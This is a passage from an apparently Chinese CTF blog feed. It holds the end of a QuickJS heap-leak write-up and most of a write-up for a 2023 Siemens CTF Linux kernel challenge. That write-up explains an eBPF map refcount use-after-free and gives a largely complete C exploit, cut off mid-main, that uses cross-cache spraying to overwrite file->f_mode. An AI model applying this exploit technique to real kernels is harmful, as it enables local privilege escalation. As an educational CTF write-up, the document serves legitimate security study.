0x8db68n, system: 0x5c110n</span><br></code></pre></td></tr></table></figure><h1 id="一点题外话"><a href="#一点题外话" class="headerlink" title="一点题外话"></a>一点题外话</h1><p>在discord找了个exp，有这么一段</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs javascript">arr = [<span class="hljs-number">0xfffffffffffffffffffn</span>]<br>num = arr.<span class="hljs-title function_">randompick</span>()<br>num2 = arr.<span class="hljs-title function_">randompick</span>()<br>num3 = arr.<span class="hljs-title function_">randompick</span>()<br><span class="hljs-keyword">delete</span> num<br><span class="hljs-keyword">delete</span> num3<br><br>heap_leak = (num2&gt;&gt;(<span class="hljs-number">5n</span>*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span><br>libc_leak = (num2&gt;&gt;(<span class="hljs-number">7n</span>*<span class="hljs-number">0x40n</span>)) &amp; <span class="hljs-number">0xffffffffffffffffn</span> - <span class="hljs-number">0x210c50n</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(heap_leak.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(libc_leak.<span class="hljs-title function_">toString</span>(<span class="hljs-number">16</span>))<br></code></pre></td></tr></table></figure><p>但理论上来说delete只对对象属性起效，这么写应该会false才对</p><p>后来才注意到这个声明没用let，后来查到这种<strong>隐式声明</strong>相当于给全局对象增加一个属性，所以是有效的</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs javascript">num = <span class="hljs-number">114514n</span><br><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(globalThis)<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">qjs tmp.js</span><br>&#123; console: &#123; log: [Function] &#125;, performance: &#123; now: [Function] &#125;, scriptArgs: [ &quot;tmp.js&quot; ], print: [Function print], num: 114514n &#125;<br></code></pre></td></tr></table></figure><p><em>虽然跟这道题没什么关系，樂</em></p><p>做这道题的时候重新想起了被v8支配的恐惧，这种js解释器的题最恶心的就是代码但凡有一点小变化整个堆布局大动……</p><img src="/2025/09/13/asis2025qjs/kita.jpg" class title="kita"><p>后来发现可以随便塞点变量调堆，别管为什么有用就行（</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs javascript"><span class="hljs-keyword">const</span> pad1 = <span class="hljs-string">&quot;a&quot;</span>, pad2 = <span class="hljs-string">&quot;a&quot;</span>, pad3 = <span class="hljs-string">&quot;a&quot;</span>, pad4 = <span class="hljs-string">&quot;a&quot;</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>JavaScript</category>
      
    </categories>
    
    
    <tags>
      
      <tag>wp</tag>
      
      <tag>js</tag>
      
      <tag>quickjs</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2023 西门子白帽黑客大赛 pwn wp</title>
    <link href="/2025/09/01/ximenzi/"/>
    <url>/2025/09/01/ximenzi/</url>
    
    <content type="html"><![CDATA[<p>又翻出一道历史悠久的题</p><span id="more"></span><h1 id="漏洞"><a href="#漏洞" class="headerlink" title="漏洞"></a>漏洞</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c">diff --git a/kernel/bpf/verifier.c b/kernel/bpf/verifier.c<br>index <span class="hljs-number">264b</span>3dc714cc.<span class="hljs-number">.49263e1295</span>db <span class="hljs-number">100644</span><br>--- a/kernel/bpf/verifier.c<br>+++ b/kernel/bpf/verifier.c<br>@@ <span class="hljs-number">-12900</span>,<span class="hljs-number">7</span> +<span class="hljs-number">12900</span>,<span class="hljs-number">7</span> @@ <span class="hljs-type">static</span> <span class="hljs-type">int</span> <span class="hljs-title function_">resolve_pseudo_ldimm64</span><span class="hljs-params">(<span class="hljs-keyword">struct</span> bpf_verifier_env *env)</span><br>  * will be used by the valid program until it&#x27;s unloaded<br>  * and all maps are released in <span class="hljs-title function_">free_used_maps</span><span class="hljs-params">()</span><br>  */<br>-<span class="hljs-title function_">bpf_map_inc</span><span class="hljs-params">(<span class="hljs-built_in">map</span>)</span>;<br>+<span class="hljs-comment">//bpf_map_inc(map);</span><br> <br> aux-&gt;map_index = env-&gt;used_map_cnt;<br> env-&gt;used_maps[env-&gt;used_map_cnt++] = <span class="hljs-built_in">map</span>;<br></code></pre></td></tr></table></figure><p>bpf_check如果ebpf program使用了某个map会把map-&gt;refcnt+1，patch把这行注释了。如果load ebpf program后close(map)，仍然可以通过ebpf program对map进行读写，造成了uaf</p><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>bpf_check检查通过后会把ebpf program转换成可执行代码，bpf_prog-&gt;bpf_func指向这段代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog</span> &#123;</span><br>u16                        pages;                <span class="hljs-comment">/*     0     2 */</span><br>u16                        jited:<span class="hljs-number">1</span>;              <span class="hljs-comment">/*     2: 0  2 */</span><br>u16                        jit_requested:<span class="hljs-number">1</span>;      <span class="hljs-comment">/*     2: 1  2 */</span><br>u16                        gpl_compatible:<span class="hljs-number">1</span>;     <span class="hljs-comment">/*     2: 2  2 */</span><br>u16                        cb_access:<span class="hljs-number">1</span>;          <span class="hljs-comment">/*     2: 3  2 */</span><br>u16                        dst_needed:<span class="hljs-number">1</span>;         <span class="hljs-comment">/*     2: 4  2 */</span><br>u16                        blinding_requested:<span class="hljs-number">1</span>; <span class="hljs-comment">/*     2: 5  2 */</span><br>u16                        blinded:<span class="hljs-number">1</span>;            <span class="hljs-comment">/*     2: 6  2 */</span><br>u16                        is_func:<span class="hljs-number">1</span>;            <span class="hljs-comment">/*     2: 7  2 */</span><br>u16                        kprobe_override:<span class="hljs-number">1</span>;    <span class="hljs-comment">/*     2: 8  2 */</span><br>u16                        has_callchain_buf:<span class="hljs-number">1</span>;  <span class="hljs-comment">/*     2: 9  2 */</span><br>u16                        enforce_expected_attach_type:<span class="hljs-number">1</span>; <span class="hljs-comment">/*     2:10  2 */</span><br>u16                        call_get_stack:<span class="hljs-number">1</span>;     <span class="hljs-comment">/*     2:11  2 */</span><br>u16                        call_get_func_ip:<span class="hljs-number">1</span>;   <span class="hljs-comment">/*     2:12  2 */</span><br>u16                        tstamp_type_access:<span class="hljs-number">1</span>; <span class="hljs-comment">/*     2:13  2 */</span><br><br><span class="hljs-comment">/* XXX 2 bits hole, try to pack */</span><br><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_prog_type</span>         <span class="hljs-title">type</span>;</span>                 <span class="hljs-comment">/*     4     4 */</span><br><span class="hljs-class"><span class="hljs-keyword">enum</span> <span class="hljs-title">bpf_attach_type</span>       <span class="hljs-title">expected_attach_type</span>;</span> <span class="hljs-comment">/*     8     4 */</span><br>u32                        len;                  <span class="hljs-comment">/*    12     4 */</span><br>u32                        jited_len;            <span class="hljs-comment">/*    16     4 */</span><br>u8                         tag[<span class="hljs-number">8</span>];               <span class="hljs-comment">/*    20     8 */</span><br><br><span class="hljs-comment">/* XXX 4 bytes hole, try to pack */</span><br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_prog_stats</span> *    <span class="hljs-title">stats</span>;</span>                <span class="hljs-comment">/*    32     8 */</span><br><span class="hljs-type">int</span> *                      active;               <span class="hljs-comment">/*    40     8 */</span><br><span class="hljs-type">unsigned</span> <span class="hljs-title function_">int</span>               <span class="hljs-params">(*bpf_func)</span><span class="hljs-params">(<span class="hljs-type">const</span> <span class="hljs-type">void</span>  *, <span class="hljs-type">const</span> <span class="hljs-keyword">struct</span> bpf_insn  *)</span>; <span class="hljs-comment">/*  /</span><br><span class="hljs-comment">struct bpf_prog_aux *      aux;                  /*    56     8 */</span><br><span class="hljs-comment">/* --- cacheline 1 boundary (64 bytes) --- */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_fprog_kern</span> *   <span class="hljs-title">orig_prog</span>;</span>            <span class="hljs-comment">/*    64     8 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>&#125; __empty_insns;                 <span class="hljs-comment">/*    72     0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">sock_filter</span> <span class="hljs-title">insns</span>[0];</span>     <span class="hljs-comment">/*    72     0 */</span><br>&#125;;                                       <span class="hljs-comment">/*    72     0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> &#123;</span><br>&#125; __empty_insnsi;                <span class="hljs-comment">/*    72     0 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">insnsi</span>[0];</span>       <span class="hljs-comment">/*    72     0 */</span><br>&#125;;                                       <span class="hljs-comment">/*    72     0 */</span><br>&#125;;                                               <span class="hljs-comment">/*    72     0 */</span><br><br><span class="hljs-comment">/* size: 72, cachelines: 2, members: 26 */</span><br><span class="hljs-comment">/* sum members: 66, holes: 1, sum holes: 4 */</span><br><span class="hljs-comment">/* sum bitfield members: 14 bits, bit holes: 1, sum bit holes: 2 bits */</span><br><span class="hljs-comment">/* last cacheline: 8 bytes */</span><br>&#125;;<br></code></pre></td></tr></table></figure><img src="/2025/09/01/ximenzi/bpf_prog.png" class title="bpf_prog"><p>bpf_array的内容就跟在bpf_array结构体之后，其他bpf_map同理</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array</span> &#123;</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map</span>             <span class="hljs-title">map</span>;</span>                  <span class="hljs-comment">/*     0   256 */</span><br><br><span class="hljs-comment">/* XXX last struct has 26 bytes of padding */</span><br><br><span class="hljs-comment">/* --- cacheline 4 boundary (256 bytes) --- */</span><br>u32                        elem_size;            <span class="hljs-comment">/*   256     4 */</span><br>u32                        index_mask;           <span class="hljs-comment">/*   260     4 */</span><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_array_aux</span> *     <span class="hljs-title">aux</span>;</span>                  <span class="hljs-comment">/*   264     8 */</span><br><span class="hljs-class"><span class="hljs-keyword">union</span> &#123;</span><br><span class="hljs-type">char</span>               value[<span class="hljs-number">0</span>];             <span class="hljs-comment">/*   272     0 */</span><br><span class="hljs-type">void</span> *             ptrs[<span class="hljs-number">0</span>];              <span class="hljs-comment">/*   272     0 */</span><br><span class="hljs-type">void</span> *             pptrs[<span class="hljs-number">0</span>];             <span class="hljs-comment">/*   272     0 */</span><br>&#125;;                                               <span class="hljs-comment">/*   272     0 */</span><br><br><span class="hljs-comment">/* size: 320, cachelines: 5, members: 5 */</span><br><span class="hljs-comment">/* padding: 48 */</span><br><span class="hljs-comment">/* paddings: 1, sum paddings: 26 */</span><br>&#125; __attribute__((__aligned__(<span class="hljs-number">64</span>)));<br></code></pre></td></tr></table></figure><img src="/2025/09/01/ximenzi/bpf_array.png" class title="bpf_array"><p>如果ebpf program使用了map且bpf_check通过后，bpf_prog-&gt;bpf_func直接使用map的地址定位content</p><img src="/2025/09/01/ximenzi/bpf_func.png" class title="bpf_func"><p>以上特性说明两点：</p><ol><li>bpf_array的大小可变，通过改变array大小</li><li>不用担心map重新分配后内容被破坏，因为bpf_prog-&gt;bpf_func对map的操作不使用bpf_map的数据</li></ol><h1 id="Exp"><a href="#Exp" class="headerlink" title="Exp"></a>Exp</h1><p>改busybox的打法，Cross-Cache到filp然后ebpf program改file-&gt;f_mode</p><p>选择控制bpf_array大小为512。再大一个slab会占多个page，分配会靠后；file结构体256，所以不能再小。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;mykernel.h&quot;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&quot;bpf_insn.h&quot;</span></span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> FILE_SPRAY_N    0x300</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> MAP_SPRAY_N     8*16</span><br><br><br><span class="hljs-type">static</span> <span class="hljs-keyword">inline</span> <span class="hljs-type">int</span> <span class="hljs-title function_">bpf</span><span class="hljs-params">(<span class="hljs-type">int</span> cmd, <span class="hljs-keyword">union</span> bpf_attr *attr)</span><br>&#123;<br>    <span class="hljs-keyword">return</span> syscall(__NR_bpf, cmd, attr, <span class="hljs-keyword">sizeof</span>(*attr));<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_create</span><span class="hljs-params">(<span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_type, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> key_size,</span><br><span class="hljs-params">               <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> value_size, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> max_entries, <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> map_flags)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_type = map_type,<br>                .key_size = key_size,<br>                .value_size = value_size,<br>                .max_entries = max_entries,<br>                .map_flags = map_flags,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_CREATE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_lookup_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_LOOKUP_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_freeze</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_FREEZE, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_update_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* value)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .value = (<span class="hljs-type">uint64_t</span>)value,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_UPDATE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_delete_elem</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_DELETE_ELEM, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">int</span><br><span class="hljs-title function_">bpf_map_get_next_key</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd, <span class="hljs-type">const</span> <span class="hljs-type">void</span>* key, <span class="hljs-type">void</span>* next_key)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .map_fd = map_fd,<br>                .key = (<span class="hljs-type">uint64_t</span>)key,<br>                .next_key = (<span class="hljs-type">uint64_t</span>)next_key,<br>        &#125;;<br>        <span class="hljs-keyword">return</span> bpf(BPF_MAP_GET_NEXT_KEY, &amp;attr);<br>&#125;<br><br><span class="hljs-type">static</span> __always_inline <span class="hljs-type">uint32_t</span><br><span class="hljs-title function_">bpf_map_get_info_by_fd</span><span class="hljs-params">(<span class="hljs-type">int</span> map_fd)</span><br>&#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_map_info</span> <span class="hljs-title">info</span>;</span><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">attr</span> =</span> &#123;<br>                .info.bpf_fd = map_fd,<br>                .info.info_len = <span class="hljs-keyword">sizeof</span>(info),<br>                .info.info = (<span class="hljs-type">uint64_t</span>)&amp;info,<br><br>        &#125;;<br>        bpf(BPF_OBJ_GET_INFO_BY_FD, &amp;attr);<br>        <span class="hljs-keyword">return</span> info.btf_id;<br>&#125;<br><br><span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">bpf_insn</span> <span class="hljs-title">hack_prog</span>[] =</span> &#123;<br>        BPF_MOV64_REG(BPF_REG_9, BPF_REG_1),    <span class="hljs-comment">// reg9 = ctx</span><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br><br>        BPF_MOV64_REG(BPF_REG_2, BPF_REG_10),   <span class="hljs-comment">// reg2 = fp</span><br>        BPF_STX_MEM(BPF_W, BPF_REG_10, BPF_REG_0, <span class="hljs-number">-4</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_2, <span class="hljs-number">-4</span>),  <span class="hljs-comment">// reg2 = fp - 4</span><br><br>        BPF_LD_MAP_FD(BPF_REG_1, <span class="hljs-number">3</span>*<span class="hljs-number">8</span>+<span class="hljs-number">3</span>),<br><br>        <span class="hljs-comment">// map_lookup_elem(map_fd(x), fp - 4)</span><br>        BPF_RAW_INSN(BPF_JMP | BPF_CALL, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>, BPF_FUNC_map_lookup_elem),<br><br>        BPF_JMP_IMM(BPF_JNE, BPF_REG_0, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>),<br>        BPF_EXIT_INSN(),<br><br>        BPF_MOV64_IMM(BPF_REG_1, <span class="hljs-number">2</span>|<span class="hljs-number">0x40000</span>|<span class="hljs-number">0xa801d</span>),<br>        BPF_ALU64_IMM(BPF_ADD, BPF_REG_0, <span class="hljs-number">0x34</span>),<br>        BPF_STX_MEM(BPF_W, BPF_REG_0, BPF_REG_1, <span class="hljs-number">0</span>),<br><br>        BPF_MOV64_IMM(BPF_REG_0, <span class="hljs-number">0</span>),<br>        BPF_EXIT_INSN(),<br>&#125;;<br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> BPF_LOG_SZ 0x20000</span><br><span class="hljs-type">char</span> bpf_log_buf[BPF_LOG_SZ] = &#123; <span class="hljs-string">&#x27;\0&#x27;</span> &#125;;<br><br><span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">hack_attr</span> =</span> &#123;<br>    .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,<br>    .insns = (<span class="hljs-type">uint64_t</span>) &amp;hack_prog,<br>    .insn_cnt = <span class="hljs-keyword">sizeof</span>(hack_prog) / <span class="hljs-keyword">sizeof</span>(hack_prog[<span class="hljs-number">0</span>]),<br>    .license = (<span class="hljs-type">uint64_t</span>) <span class="hljs-string">&quot;GPL&quot;</span>,<br>    .log_level = <span class="hljs-number">2</span>,<br>    .log_buf = (<span class="hljs-type">uint64_t</span>) bpf_log_buf,<br>    .log_size = BPF_LOG_SZ,<br>&#125;;<br><br><span class="hljs-type">char</span> buffer[<span class="hljs-number">0x8000</span>] = <span class="hljs-string">&quot;eurus&quot;</span>;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger</span><span class="hljs-params">(<span class="hljs-type">int</span> fd_tmp)</span> &#123;<br>        <span class="hljs-class"><span class="hljs-keyword">struct</span> __<span class="hljs-title">sk_buff</span> <span class="hljs-title">md</span> =</span> &#123;&#125;;<br><br>        <span class="hljs-class"><span class="hljs-keyword">union</span> <span class="hljs-title">bpf_attr</span> <span class="hljs-title">test_run_attr</span> =</span> &#123;<br>                .test.prog_fd = fd_tmp,<br>                .test.data_size_in = <span class="hljs-number">0x300</span>,<br>                .test.data_in = (<span class="hljs-type">uint64_t</span>)&amp;buffer,<br>                .test.ctx_size_in = <span class="hljs-keyword">sizeof</span>(md),<br>                .test.ctx_in = (<span class="hljs-type">uint64_t</span>)&amp;md,<br>        &#125;;<br><br>        bpf(BPF_PROG_TEST_RUN, &amp;test_run_attr);<br>&#125;<br><br><br><span class="hljs-type">int</span> file_fds[FILE_SPRAY_N];<br><span class="hljs-type">int</span> map_fds[MAP_SPRAY_N];<br><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br><br>        setbuf(<span class="hljs-built_in">stdin</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-literal">NULL</span>);<br>        setbuf(<span class="hljs-built_in">stderr</span>, <span class="hljs-literal">NULL</span>);<br>        <br>        save_status();<br>        bind_core(<span class="hljs-number">0</span>);<br><br>        prctl(PR_SET_NAME, <span 